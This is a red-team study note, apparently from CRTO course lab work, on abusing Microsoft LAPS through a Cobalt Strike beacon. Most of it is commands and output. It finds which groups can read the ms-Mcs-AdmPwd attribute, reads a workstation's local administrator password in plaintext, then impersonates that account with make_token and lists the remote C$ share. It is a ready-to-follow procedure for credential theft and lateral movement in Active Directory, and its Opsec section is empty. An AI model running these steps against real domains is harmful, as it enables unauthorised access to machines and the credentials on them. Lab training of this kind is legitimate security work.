

#### 🖊️ via Cobalt Strike

1) We can discover which principals are allowed to read the `ms-Mcs-AdmPwd` attribute by reading its DACL on each computer object.

```
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

ObjectDN                                                      SecurityIdentifier                          
--------                                                      ------------------                          
CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io         S-1-5-21-569305411-121244042-2357301523-1107
CN=WEB,OU=Web Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io   S-1-5-21-569305411-121244042-2357301523-1108
CN=SQL-2,OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io S-1-5-21-569305411-121244042-2357301523-1108
CN=WKSTN-1,OU=Workstations,DC=dev,DC=cyberbotic,DC=io         S-1-5-21-569305411-121244042-2357301523-1107

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1108
DEV\Support Engineers
```

2) Dedicated tooling such as the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) also exist.  `Find-LAPSDelegatedGroups` will query each OU and find domain groups that have delegated read access.

```
beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
beacon> powershell Find-LAPSDelegatedGroups

OrgUnit                                              Delegated Groups     
-------                                              ----------------     
OU=Workstations,DC=dev,DC=cyberbotic,DC=io           DEV\Developers       
OU=Servers,DC=dev,DC=cyberbotic,DC=io                DEV\Support Engineers
OU=Web Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io DEV\Support Engineers
OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io DEV\Support Engineers
```

3) `Find-AdmPwdExtendedRights` goes a little deeper and queries each individual computer for users that have "All Extended Rights".  This will reveal any users that can read the attribute without having had it specifically delegated to them.

To get a computer's password, simply read the attribute.

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd

ms-mcs-admpwd 
------------- 
1N3FyjJR5L18za
```

Here since our user beacon is part of the DEV group, we should have full access. 

4) The `make_token` command is an easy way to leverage it.

```
beacon> make_token .\LapsAdmin 1N3FyjJR5L18za
[+] Impersonated DEV\bfarmer

beacon> ls \\wkstn-1\c$
[*] Listing: \\wkstn-1\c$\

Size     Type    Last Modified         Name
----     ----    -------------         ----
          dir     08/16/2022 08:17:30   $Recycle.Bin
          dir     08/15/2022 22:22:31   $WinREAgent
          dir     01/27/2022 18:18:49   Documents and Settings
```



#### ⚠ Opsec




### Properties
---
📆 created   {{28-02-2024}} 09:06
🏷️ tags: #redteam #crto 

---

